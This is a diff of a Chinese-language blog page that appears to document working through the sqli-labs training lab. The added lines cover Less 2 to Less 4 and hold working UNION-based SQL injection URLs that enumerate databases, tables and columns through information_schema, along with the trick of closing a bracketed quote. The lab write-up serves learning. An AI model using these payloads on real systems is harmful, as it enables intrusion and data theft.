@@ -89,10 +89,12 @@
 <meta property="og:site_name" content="BoBo&#39;s Blog">
 <meta property="og:description" content="sqli-labs学习">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-28T11:47:35.561Z">
+<meta property="og:image" content="http://bobosec.top/2019/02/26/sqli-labs/less4-1.jpg">
+<meta property="og:updated_time" content="2019-02-28T12:33:17.042Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
 <meta name="twitter:description" content="sqli-labs学习">
+<meta name="twitter:image" content="http://bobosec.top/2019/02/26/sqli-labs/less4-1.jpg">
 
 
 
@@ -429,6 +431,16 @@
 <p>爆当前数据库和版本：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,database(),version()--+</code></p>
 <p>查询所有数据库：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
 <p>查flag数据库的表：<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;flag&#39;</code></p>
+<p>查fl4g表的字段<code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h2><p>输入单引号测试发现报错是：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at 
+line 1</code></p>
+<p>发现多了个括号，于是把括号闭合一下就可以了，后台应该是把输入的id写成<code>(&#39;$id&#39;)</code>这样了</p>
+<p>测试发现<code>http://localhost/sqli-labs-master/Less-3/?id=-1%27%20)%20union%20select%201,2,3--+</code>在2，3位有回显所以和前两关差不多依次爆数据库，爆表，爆列，字段</p>
+<p>列所有数据库：<code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
+<p>这里不一一赘述了，直接给出后面payload</p>
+<p><code>http://localhost/sqli-labs-master/Less-3/?id=-1&#39; ) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;--+</code></p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h2><p>通过单引号测试发现没有异常，于是双引号测试一下，发现报错</p>
+<p><img src="/2019/02/26/sqli-labs/less4-1.jpg" alt=" "></p>
 
       
     </div>
@@ -680,7 +692,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识："><span class="nav-number">1.</span> <span class="nav-text">基础知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">1.1.</span> <span class="nav-text">Less 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">1.2.</span> <span class="nav-text">Less 2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识："><span class="nav-number">1.</span> <span class="nav-text">基础知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">1.1.</span> <span class="nav-text">Less 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">1.2.</span> <span class="nav-text">Less 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-number">1.3.</span> <span class="nav-text">Less 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-number">1.4.</span> <span class="nav-text">Less 4</span></a></li></ol></li></ol></div>
             
 
           </div>
